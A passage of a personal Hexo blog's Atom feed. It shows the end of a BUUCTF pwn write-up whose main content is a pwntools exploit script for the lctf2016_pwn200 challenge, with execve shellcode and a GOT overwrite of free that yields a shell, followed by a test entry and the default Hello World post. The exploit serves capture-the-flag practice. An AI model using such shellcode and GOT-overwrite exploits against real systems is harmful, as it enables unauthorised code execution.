“.txt” not in file and not os.path.exists(file)):<br>            os.mkdir(file)<br>            a+=1<br>            print(a)</p><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># NO.52 lctf2016_pwn200_sovle</span><br><span class="line"></span><br><span class="line">### exp</span><br></pre></td></tr></table></figure></code></pre><p>#-<em>- coding:utf-8-</em>-<br>from pwn import *<br>from LibcSearcher import *<br>context(os=”linux”, arch=”amd64”, log_level=”debug”)<br>local = 1<br>if local:<br>    p = process(‘./lctf2016_pwn200’)<br>else:<br>    p = remote(‘node3.buuoj.cn’,28784)<br>elf = ELF(‘lctf2016_pwn200’)<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’)</p><p>free_got = elf.got[‘free’]<br>shellcode = “\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05”<br>p.sendafter(‘who are u?\n’,shellcode.ljust(48,’a’))<br>print(shellcode.ljust(48,’a’))<br>ebp = u64(p.recvuntil(‘\x7f’)[-6:].ljust(8,’\x00’))<br>shellcode_addr = ebp - 0x50</p><p>p.recvuntil(‘give me your id ~~?\n’)<br>p.sendline(‘0’)<br>print “ebp_addr = “ + hex(ebp)<br>print “shellcode_addr = “ + hex(shellcode_addr)<br>p.recvuntil(‘\n’)</p><p>payload = p64(shellcode_addr)<br>p.send(payload + ‘\x00’*(0x38-len(payload)) + p64(free_got))  #the juck data must be ‘\x00’ in the got!<br>p.recvuntil(‘choice :’)<br>p.sendline(‘2’)<br>p.interactive()</p><pre><code></code></pre>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;BUUCTF-PWN-WP-To-be-continued-…&quot;&gt;&lt;a href=&quot;#BUUCTF-PWN-WP-To-be-continued-…&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF-PWN WP To be continued …..&quot;&gt;&lt;/a&gt;BUUCTF-PWN WP To be continued …..&lt;/h3&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="https://adam-01.github.io/2019/11/13/1/"/>
    <id>https://adam-01.github.io/2019/11/13/1/</id>
    <published>2019-11-13T07:01:09.000Z</published>
    <updated>2019-11-13T07:11:15.443Z</updated>
    
    
    
    
    
    <category term="test0000他" scheme="https://adam-01.github.io/tags/test0000%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://adam-01.github.io/2019/11/13/hello-world/"/>
    <id>https://adam-01.github.io/2019/11/13/hello-world/</id>
    <published>2019-11-13T06:49:34.047Z</published>
    <updated>2019-11-14T05:40:40.061Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;doc</summary>
      
    
    
    
    
  </entry>
  
</feed>
